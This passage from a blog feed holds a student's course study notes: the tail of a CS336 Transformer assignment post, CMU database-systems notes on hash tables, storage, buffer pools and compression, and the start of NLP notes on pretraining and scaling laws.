allow using an effective batchsize of 64+ while staying within GPU memory limits with batch_size=8 perstep.</li><li><strong>Mixed precision training</strong>: Using<code>torch.cuda.amp</code> with bfloat16 would reduce memory usage andincrease throughput, potentially enabling larger batch sizes or moresteps.</li><li><strong>KV-cache for generation</strong>: The current generationimplementation recomputes all attention scores from scratch for each newtoken. A KV-cache would store past key-value pairs, reducing generationcost from O(n²) to O(n) per token.</li></ul><hr /><p><em>This blog post documents the implementation of CS336 Assignment 1(Spring 2025). All code was written from scratch in PyTorch, withexperiments run on NVIDIA H100 GPUs via the Pittsburgh SupercomputingCenter (PSC).</em></p>]]></content>
      
      
      <categories>
          
          <category> Stanford CS336 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> AI </tag>
            
            <tag> Assignment </tag>
            
            <tag> Transformer </tag>
            
            <tag> LLM </tag>
            
            <tag> CS336 </tag>
            
            <tag> PyTorch </tag>
            
            <tag> Stanford </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>15645 Database systems: Hash Tables</title>
      <link href="/2026/02/07/15645-Database-Systems/15645-Database-systems-Hash-Tables/"/>
      <url>/2026/02/07/15645-Database-Systems/15645-Database-systems-Hash-Tables/</url>
      
        <content type="html"><![CDATA[<h1 id="lec7-hash-tables">Lec7 Hash Tables</h1><h2 id="background">Background</h2><p><strong>Data Structures in DBMS</strong>: Internal Meta-data, CoreData Storage, Temporary Data Structures, Table Indexes</p><p><strong>Design Decisions</strong>: <u>Data Organization</u> (how welayout data in memory/pages and what information to store to supportefficient access.) and <strong>Concurrency</strong> (enable multiplethread s to access the data structure at the same time)</p><p><strong>Hash Tables</strong>: <u>unordered associative array</u> thatmaps keys to values; <u>Space complexity is O(n)</u>, <u>Time Complexityis average O(1), worst O(n)</u>.</p><p><strong>Unrealistic Assumptions</strong>: Number of elements is<u>known ahead of time and fixed</u>; Each key is <u>unique</u>; Perfecthash function guarantees <u>no collisions</u>.</p><h2 id="hash-functions">Hash functions</h2><p>We care how to map a large key space into a smaller domain, the maingoal is the trade-off between being <strong>fast</strong>vs. <strong>collision rate</strong>.</p><p>Examples: CRC-64 (1975)、MurmurHash (2008)、Google CityHash(2011)、Facebook XXHash (2012, state-of-the-art)、Google FarmHash(2014)、RapidHash (2019)</p><h2 id="static-hashing-schemes">Static Hashing Schemes</h2><h3 id="linear-probe-hashing">Linear Probe Hashing</h3><p>Single giant table of fixed-length slots.</p><p>Resolve collisions by linearly searching for the next free slot inthe table.</p><ul><li>To determine whether an element is present, hash to a location inthe table and scan for it.</li><li>Store keys in table to know when to stop scanning.</li><li>Insertions and deletions are generalizations of lookups</li></ul><p>The table’s <strong>load factor</strong> determines when it isbecoming too full and should be resized.</p><blockquote><p>Load Factor = Active Keys / # of Slots; Allocate a new table twice aslarge and rehash entries</p></blockquote><p><strong>Key-Value Entries</strong>:</p><ul><li>Fixed-length: inline store or optionally store the key’s hash withthe key for faster comparisons.</li><li>Variable-length: Insert the kv data in separate a private temporarytable and store hash + RecordId</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260207135932206.png" alt="image-20260207135932206" style="zoom:33%;" /></p><p><strong>Delete Strategy</strong>:</p><ul><li>Movement: After deletion, scan forward and rehash each key untilhitting an empty slot to fill the gap. <strong>Expensive; no DBMS usesthis.</strong></li><li>Tombstone: Mark the slot as deleted. Lookups skip over it; insertscan reuse it. Needs periodic GC. This is what everyone uses.</li></ul><p><strong>Non-unique Keys</strong>:</p><ul><li>Separate Linked List</li><li>Redundant Keys</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260207141247097.png" alt="image-20260207141247097" style="zoom:33%;" /></p><p><strong>Optimization</strong>:</p><ul><li><strong>Specialization by key type/size</strong>: Use different hashtable implementations optimized for different key sizes (e.g., shortstrings vs. long strings) to enable faster comparisons.</li><li><strong>Separate metadata storage</strong>: Store a packed bitmapseparately to track slot status (empty/tombstone/occupied). Scanning thebitmap is much more cache-friendly than touching every full slot.</li><li><strong>Table + slot versioning</strong>: Each slot records thetable version when written. To clear the entire table, just incrementthe global version — any slot with a stale version is treated as empty.O(1) bulk invalidation.</li></ul><h3 id="cuckoo-hashing">Cuckoo Hashing</h3><p>Use <strong>multiple hash</strong> functions to find multiplelocations in the hash table to insert records.</p><ul><li>On <strong>insert, check multiple locations</strong> and pick theone that is empty.</li><li>If no location is available, <strong>evict the element</strong> fromone of them and then re-hash it find a new location.</li></ul><h2 id="dynamic-hashing-schemes">Dynamic Hashing Schemes</h2><p>Previous hash tables require the DBMS to know the number of elementsit wants to store. Otherwise it <u>must rebuild the table</u> if itneeds to grow/shrink in size.</p><p>Dynamic hash tables <u>incrementally resize themselves asneeded</u>.</p><h3 id="chained-hashing">Chained Hashing</h3><p>Maintain a linked list of buckets for each slot in the hashtable.</p><p>Resolve collisions by placing all elements with the same hash keyinto the same bucket.</p><p>We can add a bloom filter toe help filter non-exist key.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260207142956981.png" alt="image-20260207142956981" style="zoom:30%;" /></p><h3 id="extendible-hashing">Extendible Hashing</h3><p>Chained-hashing approach that splits buckets incrementally instead ofletting the linked list grow forever.</p><p>Multiple slot locations can point to the same bucket chain.</p><p>Reshuffle bucket entries on split and increase the number of bits toexamine.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260207144821584.png" alt="image-20260207144821584" style="zoom:40%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260207145132035.png" alt="image-20260207145132035" style="zoom:33%;" /></p><h3 id="linear-hashing">Linear Hashing</h3><p><strong>Linear Hashing</strong>: Maintains a split pointer thatadvances sequentially. When any bucket overflows, split the bucket atthe split pointer (not the overflowed one), using<code>hash2 = key % 2n</code> to redistribute its entries between theold bucket and a new one.</p><p><strong>Lookup rule</strong>: Compute <code>hash1(key)</code>. Ifresult &lt; split pointer, that bucket was already split, so use<code>hash2(key)</code> instead. If result ≥ split pointer,<code>hash1</code> is correct.</p><p><strong>Round completion</strong>: When the split pointer reaches theend, all buckets have been split. Drop <code>hash1</code>, promote<code>hash2</code> to the new <code>hash1</code>, create<code>hash2 = key % 4n</code>, reset pointer to 0. At most two hashfunctions coexist at any time.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260207145824285.png" alt="image-20260207145824285" style="zoom:40%;" /></p>]]></content>
      
      
      <categories>
          
          <category> CMU 15-645 Database Systems </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMU </tag>
            
            <tag> Study Notes </tag>
            
            <tag> Database Systems </tag>
            
            <tag> 15645 </tag>
            
            <tag> Hash Tables </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>15645 Database systems: Storage</title>
      <link href="/2026/01/31/15645-Database-Systems/15645-Database-systems-Storage/"/>
      <url>/2026/01/31/15645-Database-Systems/15645-Database-systems-Storage/</url>
      
        <content type="html"><![CDATA[<h1 id="lec3-database-storage-files-pages">Lec3 Database Storage: Files&amp; Pages</h1><h2 id="storage-hierarchy">Storage Hierarchy</h2><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260201113518099.png" alt="image-20260201113518099" style="zoom:100%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260201113835345.png" alt="image-20260201113835345" style="zoom:100%;" /></p><h2 id="heap-file">Heap File</h2><p>A heap file is an unordered collection of pages with tuples that arestored in random order.</p><p>Need additional meta-data to track location of files and free spaceavailability.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260201130006343.png" alt="image-20260201130006343" style="zoom:50%;" /></p><h2 id="page-layout">Page layout</h2><h3 id="page-header">Page Header</h3><p>Every page contains a header of metadata about the page’scontents.</p><p>Page Size; Checksum; DBMS Version; Transaction Visibility;Compression / Encoding Meta-data; Schema Information; Data Summary /Sketches</p><p>Approach:</p><ul><li><p><strong>Approach #1: Tuple-oriented Storage</strong></p></li><li><p><strong>Approach #2: Log-structured Storage</strong></p></li><li><p><strong>Approach #3: Index-organized Storage</strong></p></li></ul><h3 id="tuple-oriented-storage">Tuple-oriented Storage</h3><p>The most common layout scheme is called slotted pages.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260201150241807.png" alt="image-20260201150241807" style="zoom:50%;" /></p><h3 id="record-ids">RECORD IDS</h3><p>The DBMS assigns each logical tuple a unique <strong>recordidentifier</strong> that represents its physical location in thedatabase.</p><p>→ Example: File Id, Page Id, Slot #</p><h2 id="tuple-layout">Tuple layout</h2><p>A tuple is essentially a sequence of bytes prefixed with a<strong>header</strong> that contains meta-data about it.</p><h3 id="tuple-header">Tuple header</h3><p>Each tuple is prefixed with a header that contains meta-data aboutit.</p><p>→ Visibility info (concurrency control)</p><p>→ Bit Map for <strong>NULL</strong> values.</p><p>We do <u>not</u> need to store meta-data about the schema</p><h3 id="tuple-data">Tuple data</h3><p>Attributes are typically stored in the order that you specify themwhen you create the table. However, it might be more<strong>efficient</strong> to lay them out differently.</p><h1 id="lec4-buffer-pool-memory-management">Lec4 Buffer Pool MemoryManagement</h1><p>This lecture is to solve how the DBMS manages its memory and movedata back-and-forth from disk.</p><h2 id="disk-oriented-dbms-model">Disk-Oriented DBMS Model</h2><p>Modern DBMSs are <strong>disk-oriented</strong>: disk is the sourceof truth, while memory is used as a performance optimization.</p><p>Two dimensions govern data movement:</p><ul><li><strong>Spatial control</strong>: where pages are placed on disk,aiming to keep frequently co-accessed pages physically close.</li><li><strong>Temporal control</strong>: when pages are brought intomemory and when modified pages are written back to disk.</li></ul><p>The buffer pool is the core mechanism that implements temporalcontrol.</p><h2 id="buffer-pool-metadata">Buffer Pool Metadata</h2><p>To manage cached pages, the DBMS maintains in-memory metadata:</p><h3 id="page-table">Page Table</h3><ul><li>Maps <code>page_id → frame_id</code></li><li>Typically implemented as a hash table</li><li>Protected by latches for thread safety</li><li>Not persisted to disk</li></ul><h3 id="per-page-metadata">Per-Page Metadata</h3><p>Each cached page tracks:</p><ul><li><strong>Dirty flag</strong>: whether the page has been modified</li><li><strong>Pin (reference) count</strong>: number of active users;pinned pages cannot be evicted</li><li><strong>Access history</strong>: used by replacement policies</li></ul><h2 id="locks-vs.-latches">Locks vs. Latches</h2><p>The buffer pool uses <strong>latches</strong>, not locks.</p><ul><li><strong>Locks</strong> protect logical database contents and areheld for transaction duration</li><li><strong>Latches</strong> protect internal DBMS data structures andare held briefly</li></ul><p>Latches do not require rollback support and are closer tomutexes.</p><h2 id="page-directory-vs.-page-table">Page Directory vs. PageTable</h2><p>These two structures are often confused:</p><ul><li><strong>Page directory</strong>: maps pages to disk locations,persisted on disk</li><li><strong>Page table</strong>: maps pages to memory frames, existsonly in memory</li></ul><p>The directory enables recovery after restart; the page table doesnot.</p><h2 id="buffer-replacement-policies">Buffer Replacement Policies</h2><p>When the buffer pool is full and a new page must be loaded, the DBMSmust evict an existing page. Replacement policies aim to balancecorrectness, accuracy, and low overhead.</p><h3 id="lru-and-clock">LRU and CLOCK</h3><ul><li>Evict pages that were accessed least recently</li><li>CLOCK approximates LRU using a reference bit</li></ul><p>Both are vulnerable to <strong>sequential flooding</strong>, wherelarge scans evict useful pages that will soon be reused.</p><h3 id="lru-k">LRU-K</h3><p>LRU-K considers the <strong>K-th most recent access</strong> ratherthan just the last one.</p><ul><li>Pages accessed fewer than K times are treated as low-value</li><li>Helps distinguish one-time scans from truly hot pages</li><li>Requires more metadata and higher implementation complexity</li></ul><h3 id="arc">ARC</h3><p>Adaptive Replacement Cache balances recency and frequencydynamically.</p><ul><li>Maintains separate lists for recent and frequent pages</li><li>Uses ghost lists to learn from recent evictions</li><li>Adjusts behavior automatically based on workload</li></ul><p>ARC is more complex but adapts well to mixed workloads.</p><h1 id="lec5-log-structured-storage">Lec5 Log-Structured Storage</h1><p>Traditional page-oriented storage assumes that data can beoverwritten in place. However, this assumption breaks down on modernstorage systems where random writes are expensive or outrightunsupported.</p><p>Log-structured storage takes a different approach: <strong><u>insteadof modifying tuples inside pages, the DBMS records all changes as logrecords.</u></strong></p><h2 id="log-records-and-in-memory-updates">Log Records and In-MemoryUpdates</h2><p>Each modification to a tuple is represented as a log record:</p><ul><li><strong>PUT(key, value)</strong> inserts or updates a tuple</li><li><strong>DELETE(key)</strong> marks a tuple as deleted</li></ul><p>The DBMS does not immediately write these records to disk. Instead,updates are first applied to an in-memory data structure called the<strong>MemTable</strong>.</p><p>The MemTable maintains keys in sorted order and always reflects themost recent state of the database.</p><h2 id="flushing-the-memtable-to-disk">Flushing the MemTable toDisk</h2><p>When the MemTable becomes full, the DBMS flushes its contents to diskas a <strong>Sorted String Table (SSTable)</strong>.</p><p>Key properties of an SSTable:</p><ul><li>Stored as a new file on disk</li><li>Contains records sorted by key (low → high)</li><li>Immutable once written</li></ul><p>This flushed SSTable is placed into <strong>Level 0</strong>.</p><p>At this stage, multiple SSTables may exist, ordered from<strong>newest to oldest</strong>, and their key ranges may overlap.</p><h2 id="multi-level-organization">Multi-Level Organization</h2><p>As more SSTables are generated, the DBMS organizes them into multiplelevels:</p><ul><li><strong>Level 0</strong><ul><li>SSTables flushed directly from memory</li><li>Key ranges may overlap</li><li>Ordered by creation time (newest → oldest)</li></ul></li><li><strong>Lower levels (Level 1, Level 2, …)</strong><ul><li>SSTables have non-overlapping key ranges</li><li>Data is progressively older and more compact</li></ul></li></ul><p>This hierarchy allows the DBMS to absorb writes quickly at the topwhile gradually organizing data in the background.</p><h2 id="reading-data-get">Reading Data (GET)</h2><p>To process a <code>GET(key)</code> request, the DBMS searches for themost recent version of the key:</p><ol type="1"><li><strong>MemTable</strong><ul><li>Checked first, since it contains the newest updates</li></ul></li><li><strong>SummaryTable</strong><ul><li>Stores metadata such as:<ul><li>Min/max key per SSTable</li><li>Key filters per level</li></ul></li><li>Used to eliminate SSTables that cannot contain the key</li></ul></li><li><strong>Disk Levels</strong><ul><li>Level 0 is searched from newest to oldest SSTable</li><li>Lower levels are searched using key range constraints</li></ul></li></ol><p>The search stops as soon as the key is found.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260201200533436.png" alt="image-20260201200533436" style="zoom:50%;" /></p><h2 id="log-structured-compaction">Log-Structured Compaction</h2><p>Over time, SSTables accumulate outdated versions and deleted entries.To reclaim space and improve read performance, the DBMS periodicallyperforms <strong>compaction</strong>.</p><p>Compaction:</p><ul><li>Merges multiple SSTables using a sort-merge algorithm</li><li>Retains only the latest version of each key</li><li>Discards obsolete entries and tombstones</li></ul><p>This process produces new SSTables in lower levels while removing oldones.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260201200458754.png" alt="image-20260201200458754" style="zoom: 50%;" /></p><h2 id="compaction-strategies">Compaction Strategies</h2><p>The PPT introduces two compaction strategies:</p><ul><li><strong>Leveled Compaction</strong><ul><li>Organizes data into multiple levels</li><li>SSTables within a level do not overlap (except Level 0)</li><li>Optimized for read-heavy workloads</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260201200418845.png" alt="image-20260201200418845" style="zoom:50%;" /></p><ul><li><strong>Universal Compaction</strong><ul><li>Maintains a single logical level</li><li>Allows overlapping key ranges</li><li>Optimized for write-heavy workloads</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260201200354967.png" alt="image-20260201200354967" style="zoom: 50%;" /></p><h1 id="lec6-database-storage-column-stores-data-compression">Lec6Database Storage + Column Stores + Data Compression</h1><h2 id="database-workloads">Database workloads</h2><ul><li>On-Line Transaction Processing (OLTP): Fast operations that onlyread/update a small amount of data</li><li>On-Line Analytical Processing (OLAP): Complex queries that read alot of data to compute aggregates</li><li>Hybrid Transaction + Analytical Processing: OLTP + OLAP</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202140700003.png" alt="image-20260202140700003" style="zoom:40%;" /></p><h2 id="storage-model">Storage model</h2><p>A DBMS’s <strong>storage model</strong> specifies how it physicallyorganizes tuples on disk and in memory.</p><blockquote><p>Can have different performance characteristics based on targetworkload ann influence the design choices of the rest of the DBMS</p></blockquote><ul><li>N-ary Storage Model(NSM)</li><li>Decomposition Storage Model(DSM)</li><li>Hybrid Storage Model(PAX)</li></ul><h3 id="nsm">NSM</h3><p>A disk-oriented NSM system stores a tuple’s fixed-length and variablelength attributes contiguously in a single slotted page.</p><blockquote><p>The tuple’s <strong>record id</strong> (page#, slot#) is how the DBMSuniquely identifies a physical tuple</p></blockquote><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202141836961.png" alt="image-20260202141836961" style="zoom:40%;" /></p><p><strong>Advantages</strong></p><ul><li>Fast inserts, updates, and deletes.</li><li>Good for queries that need the entire tuple (OLTP).</li><li>Can use index-oriented physical storage for clustering.</li></ul><p><strong>Disadvantages</strong></p><ul><li><p>Not good for scanning large portions of the table and/or a subsetof the attributes.</p></li><li><p>Terrible memory locality in access patterns.</p></li><li><p>Not ideal for compression because of multiple value domainswithin a single page.</p></li></ul><h3 id="dsm">DSM</h3><p>Store a single attribute for all tuples contiguously in a block ofdata. <u>Also known as a “column store</u></p><blockquote><p>Ideal for OLAP workloads where read-only queries perform large scansover a subset of the table’s attributes.</p></blockquote><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202142652635.png" alt="image-20260202142652635" style="zoom:50%;" /></p><p><strong>Tuple Identfication</strong></p><ul><li>Fixed-length Offsets</li><li>Embedded Tuple Ids</li></ul><p><strong>Advantages</strong></p><ul><li><p>Reduces the amount wasted I/O per query because the DBMS onlyreads the data that it needs.</p></li><li><p>Faster query processing because of increased locality and cacheddata reuse (<strong>Lecture #14</strong>).</p></li><li><p>Better data compression because data from the same domain arephysically collocated.</p></li></ul><p><strong>Disadvantages</strong></p><ul><li>Slow for point queries, inserts, updates, and deletes because oftuple splitting/stitching/reorganization.</li></ul><h3 id="pax">PAX</h3><p><strong>Partition Attributes Across</strong> (PAX) is a hybridstorage model that vertically partitions attributes within a databasepage.</p><p>Horizontally partition data into <strong>row groups</strong>. Thenvertically partition their attributes into <strong><em>columnchunks</em></strong>.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202143955864.png" alt="image-20260202143955864" style="zoom:40%;" /></p><h2 id="database-compression">Database Compression</h2><p><strong>Goals:</strong></p><ul><li><p><strong>#1:</strong> Must produce fixed-length values. Onlyexception is var-length data stored in separate pool.</p></li><li><p><strong>#2:</strong> Postpone decompression for as long aspossible during query execution. Also known as <strong>latematerialization</strong>.</p></li><li><p><strong>#3:</strong> Must be a lossless scheme. People(typically) don’t like losing data. <strong>Any lossy compression mustbe performed by application</strong></p></li></ul><h3 id="compression-granularity">Compression Granularity</h3><ul><li><strong>Block-level</strong>: Compress a block of tuples for thesame table.</li><li><strong>Tuple-level</strong>: Compress the contents of the entiretuple (NSM-only).</li><li><strong>Attreibute-level</strong>: Compress a single attributewithin one tuple (overflow). Can target multiple attributes for the sametuple.</li><li><strong>Column-level</strong>: Compress multiple values for one ormore attributes stored for multiple tuples (DSM-only).</li></ul><h3 id="naive-compression">Naive Compression</h3><p>Compress data using a general-purpose algorithm. Scope of compressionis based on input provided.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202144852164.png" alt="image-20260202144852164" style="zoom:40%;" /></p><blockquote><p>Ideally, the DBMS can operate on compressed data <u>withoutdecompressing it first</u>.</p></blockquote><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202145041605.png" alt="image-20260202145041605" style="zoom:40%;" /></p><h3 id="columnar-compression">Columnar Compression</h3><p><strong>Run-length Encoding</strong></p><p>Compress runs of the same value in a single column into triplets:</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202145403355.png" alt="image-20260202145403355" style="zoom:30%;" /></p><hr /><p><strong>Bit-Packing Encoding</strong></p><p>If the values for an integer attribute is smaller than the range ofits given data type size, then reduce the number of bits to representeach value.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202145546669.png" alt="image-20260202145546669" style="zoom:40%;" /></p><blockquote><p><strong>Patching / Mostly Encoding</strong>: A variation of bitpacking for when an attribute’s values are “mostly” less than thelargest size, store them with smaller data type.</p></blockquote><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202145840090.png" alt="image-20260202145840090" style="zoom:40%;" /></p><hr /><p><strong>Bitmap Encoding</strong></p><p>Store a separate bitmap for each unique value for an attribute wherean offset in the vector corresponds to a tuple.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202150128385.png" alt="image-20260202150128385" style="zoom:35%;" /></p><p>But there are some flaws fo this method.</p><p>Assume we have 10 million tuples. 43,000 zip codes in the US.</p><p>→ <strong>10000000</strong> <strong>×</strong> <strong>32-bits = 40MB</strong> (Orginal)</p><p>→ <strong>10000000</strong> <strong>×</strong> <strong>43000 = 53.75GB</strong> (With Bitmap)</p><p>And every time the application inserts a new tuple, the DBMS mustextend 43,000 different bitmaps.</p><hr /><p><strong>Roaring Bitmaps</strong></p><p>Bitmap index that switches which data structure to use for a range ofvalues based local density of bits</p><ul><li>Dense chunks are stored using uncompressed bitmaps.(Can be furthercompressed with RLE)</li><li>Sparse chunks use bitpacked arrays of 16-bit integers.</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202151924937.png" alt="image-20260202151924937" style="zoom:35%;" /></p><hr /><p><strong>Delta / Frame-of-Reference Encoding</strong></p><p>Recording the difference between values that follow each other in thesame column.</p><blockquote><p>Combine with RLE to get even better compression ratios.</p></blockquote><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202150652776.png"alt="image-20260202150652776" /><figcaption aria-hidden="true">image-20260202150652776</figcaption></figure><hr /><p><strong>Dictionary Encoding</strong></p><p>Replace frequent values with smaller fixed-length codes and thenmaintain a mapping (dictionary) from the codes to the original values.(<strong>Typically, one code per attribute value</strong>.)</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202151150956.png" alt="image-20260202151150956" style="zoom:35%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202151303156.png" alt="image-20260202151303156" style="zoom:35%;" /></p><h2 id="bifurcated-environment">Bifurcated Environment</h2><p>A bifurcated environment separates OLTP and OLAP systems, moving databetween them via ETL or ELT pipelines.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202155219551.png" alt="image-20260202155219551" style="zoom:30%;" /></p><h2 id="hybrid-storage-model">Hybrid Storage Model</h2><p>Use seperate execution engines that are optimized for either NSM orDSM databases.</p><ul><li>Store new data in NSM for fast OLTP.</li><li>Migrate data to DSM for more efficient OLAP.</li></ul><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202155745470.png"alt="image-20260202155745470" /><figcaption aria-hidden="true">image-20260202155745470</figcaption></figure><h3 id="fractured-mirrors"><strong>Fractured Mirrors</strong></h3><p>Examples: Oracle, IBM DB2 Blu, Microsoft SQL Server</p><p>DBMS automatically maintains a second copy of the database in a DSMlayout.</p><ul><li>All updates are first entered in NSM then eventually copied into DSMmirror.</li><li>If the DBMS supports updates, it must invalidate tuples in the DSMmirror.</li></ul><h3 id="delta-store"><strong>Delta Store</strong></h3><p>Examples: SAP HANA, Vertica, SingleStore, Databricks, Google Napa</p><p>A background thread migrates updates from delta store and appliesthem to DSM data.</p><ul><li>Batch large chunks and then write them out as a PAX file.</li><li>Delete records in the delta store once they are in columnstore.</li></ul><blockquote><p>A delta store is a row-oriented write buffer that absorbs updates andis periodically merged into the column store in batches.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CMU 15-645 Database Systems </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMU </tag>
            
            <tag> Database </tag>
            
            <tag> 15645 </tag>
            
            <tag> Storage </tag>
            
            <tag> B-Tree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>11711 Advanced NLP: Learning &amp; Inference</title>
      <link href="/2026/01/29/11711-Advanced-NLP/11711-Advanced-NLP-Learning-Inference/"/>
      <url>/2026/01/29/11711-Advanced-NLP/11711-Advanced-NLP-Learning-Inference/</url>
      
        <content type="html"><![CDATA[<h1 id="lec6-pretraining">Lec6 Pretraining</h1><h2 id="basic-idea">Basic Idea</h2><p>The pretrained base model will be adapted to downstream tasks.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260130130847510.png" alt="image-20260130130847510" style="zoom: 33%;" /></p><p>Transfer learning: take “knowledge” from one task and apply it toanother task</p><p><strong>•</strong> <strong>Less task data</strong>: use less data toreach a given level of performance</p><p><strong>•</strong> <strong>Better task performance</strong>: reachhigher performance than training from scratch</p><p><strong>•</strong> <strong>One model, multiple tasks</strong>:convenient, amortizes cost, a starting point for many uses, …</p><h2 id="major-factors">Major Factors</h2><p>Each model is influenced by 4 major factors:</p><p><strong>•</strong> <strong>Architecture:</strong> neural networkarchitecture</p><p><strong>•</strong> <strong>Task:</strong> what the model predicts(e.g. next-token)</p><p><strong>•</strong> <strong>Data:</strong> the data used to train themodel</p><p><strong>•</strong> <strong>Hyper-parameters</strong>: e.g. learningrate, batch size</p><h2 id="masked-language-modeling">Masked Language Modeling</h2><p>Masked Language Modeling (MLM) trains a language model to<strong>predict masked tokens given the remaining visiblecontext</strong>. This objective is widely used in bidirectional modelssuch as BERT.</p><p>The MLM loss is defined as:</p><p><span class="math display">\[\mathcal{L}_{\text{MLM}}(\theta; D)=-\frac{1}{|D|}\sum_{x \in D}\;\mathbb{E}_{M \sim \text{corrupt}(x)}\sum_{t \in M}\log p_\theta(x_t \mid x_{-M})\]</span></p><ul><li><p><span class="math inline">\(x \in D\)</span>: an input sequence(sentence) from the dataset<br /></p></li><li><p><span class="math inline">\(M\)</span>: a randomly sampled set ofmasked token positions<br /></p></li><li><p><span class="math inline">\(\text{corrupt}(x)\)</span>: themasking (corruption) process applied to <spanclass="math inline">\(x\)</span><br /></p></li><li><p><span class="math inline">\(x_{-M}\)</span>: all unmasked tokensin the sequence<br /></p></li><li><p><span class="math inline">\(x_t\)</span>: the ground-truth tokenat position <span class="math inline">\(t\)</span><br /></p></li><li><p><span class="math inline">\(p_\theta(x_t \mid x_{-M})\)</span>:model probability of predicting <span class="math inline">\(x_t\)</span>given the visible context</p></li><li><p><strong>Denoising Perspective</strong> MLM can be viewed as adenoising autoencoder: the input is corrupted by masking tokens, and themodel learns to reconstruct the original sequence.</p></li><li><p><strong>Pseudo-likelihood Objective</strong>: Instead of modelingthe full joint likelihood of the sequence, MLM maximizes the sum ofconditional log-probabilities of masked tokens given the rest of thesequence. This corresponds to maximizing a <em>pseudo-likelihood</em>rather than a true joint likelihood.</p></li></ul><h2 id="autoregressive-language-modeling">Autoregressive LanguageModeling</h2><p>Predict the next token (x_t) given all previous tokens (x_{&lt;t}). [<em>{}(; D) = - </em>{x D} <em>{t=1}^{|x|} p</em>(x_t x_{&lt;t}) ]<strong>Key Properties</strong> - Maximizes the likelihood of thetraining data<br />- Fits the true data distribution (p_<em>)<br />- Equivalent to cross-entropy with a one-hot target distribution<br />- Can be interpreted as learning to <strong>compress</strong> datagenerated by (p_</em>)</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260130140511145.png" alt="image-20260130140511145" style="zoom:40%;" /></p><h2 id="evaluate-a-model">Evaluate a model</h2><ul><li>Loss(traning, validation, test)<ul><li>Diagnose training trajectory, compare models in the same family</li></ul></li><li>Few-shot prompting</li><li>Fine-tuning</li></ul><h2 id="data">Data</h2><ul><li><strong>Quantity</strong>: How much data do I have?</li><li><strong>Quality</strong>: Is it beneficial for training?(Extraction, Filtering, Deduplication)</li><li><strong>Coverage</strong>: Does the data cover the domain(s) I careabout, and in the right proportions?<ul><li>We can train a classifier filtering to help us detect thecontent</li></ul></li></ul><h1 id="lec7-scaling-laws-and-in-context-learning">Lec7 Scaling Laws andIn-Context Learning</h1><h2 id="scaling-laws">Scaling Laws</h2><h3 id="training-spending-compute">Training = Spending Compute</h3><p>Given a fixed pretraining budget, how should we allocate the budgetto achieve the best possible model?</p><p><img src="C:\Users\11946\AppData\Roaming\Typora\typora-user-images\image-20260206232739205.png" alt="image-20260206232739205" style="zoom:33%;" /></p><p>Core approximation for transformer LMs (Kaplan et al. 2020): <spanclass="math display">\[C \approx 6ND\]</span></p><ul><li><strong>N</strong> = number of parameters, <strong>D</strong> =number of tokens, <strong>C</strong> = FLOPs</li><li>Example: Llama 2 7B on 2T tokens → C ≈ 8.4 × 10²² FLOPs</li></ul><p><strong>Central question</strong>: Given fixed C, how to splitbetween N and D?</p><h3 id="power-laws">Power Laws</h3><p><span class="math display">\[L = a \cdot x^{b} \quad \Rightarrow \quad \log L = \log a + b \cdot \logx\]</span></p><p>Doubling x → L becomes L · 2ᵇ. With b = −0.095, doubling data onlyreduces loss by ~6.4%. <strong>Diminishing returns are severe</strong> —exponentially more resources for linear loss improvement.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260206233531669.png" alt="image-20260206233531669" style="zoom:40%;" /></p><h3 id="data-scaling">Data Scaling</h3><p><span class="math display">\[L = (D / D_c)^{-b}\]</span></p><ul><li>Three regions: small data → <strong>power-law region</strong> →irreducible error (bounded by data entropy)</li><li>Repeated data: ~4 epochs ≈ new data; ~40 epochs → worthless(Muennighoff+ 2025)</li><li>Different domains (Wikipedia, Books, Common Crawl) have differentscaling curves</li></ul><p><img 